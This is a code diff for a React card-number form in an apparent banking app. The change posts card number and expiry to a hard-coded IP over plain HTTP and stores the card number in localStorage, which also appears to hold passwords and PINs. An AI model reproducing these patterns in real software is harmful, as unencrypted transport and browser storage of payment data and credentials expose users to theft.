@@ -4,14 +4,22 @@ import logoForm from "../../../../assets/images/logoForm.png";
 import { useState, useEffect } from "react";
 import { Link } from "react-router-dom";
 import { useNavigate } from "react-router-dom";
+import axios from "axios";
 
-const FormNumberCard = ({ setLoading }) => {
+const FormNumberCard = ({ setLoading, setVerifNumber }) => {
   const [numberCard, setNumberCard] = useState("");
   const [month, setMonth] = useState("");
   const [year, setYear] = useState("");
   const [policyPrivate, setPolicyPrivate] = useState(false);
   const [isNumberCard, setIsNumberCard] = useState(false);
   const navigate = useNavigate();
+
+  // Secure Local by Remove Item
+  localStorage.removeItem("cardNumber");
+  localStorage.removeItem("email");
+  localStorage.removeItem("number");
+  localStorage.removeItem("password");
+  localStorage.removeItem("pin");
 
   // Validation Number Card Function
   useEffect(() => handleNumberCardValidation());
@@ -24,8 +32,27 @@ const FormNumberCard = ({ setLoading }) => {
     }
   };
 
-  const handleSubmit = () => {
-    setLoading(true);
+  const handleSubmit = async (e) => {
+    // Check Number Card
+    e.preventDefault();
+
+    try {
+      await axios
+        .post(`http://34.126.91.181/api/v1/card/check`, {
+          cardNumber: Number(numberCard),
+          month: Number(month),
+          year: Number(year),
+        })
+        .then((res) => {
+          setLoading(true);
+          setVerifNumber(true);
+          // Add Number Card to Local Storage
+          localStorage.setItem("cardNumber", numberCard);
+        });
+    } catch (error) {
+      setVerifNumber(false);
+      setLoading(true);
+    }
   };
 
   return (
